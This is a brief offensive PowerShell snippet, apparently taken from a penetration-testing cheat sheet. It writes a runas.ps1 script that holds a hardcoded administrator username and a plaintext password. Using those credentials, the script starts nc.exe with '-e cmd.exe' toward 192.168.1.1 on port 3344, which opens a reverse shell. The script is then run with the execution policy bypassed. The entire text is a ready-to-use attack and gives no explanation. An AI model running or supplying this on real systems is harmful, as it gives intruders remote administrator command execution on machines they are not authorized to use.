echo $username = 'administrator' > runas.ps1
echo $password = 'P@$$w0rd' >> runas.ps1
echo $securePassword = ConvertTo-SecureString $password -AsPlainText -Force >> runas.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
echo Start-Process nc.exe -ArgumentList ('-e','cmd.exe','192.168.1.1 3344') -Credential $credential >> runas.ps1

powershell -ExecutionPolicy Bypass -File c:\Windows\temp\runas.ps1
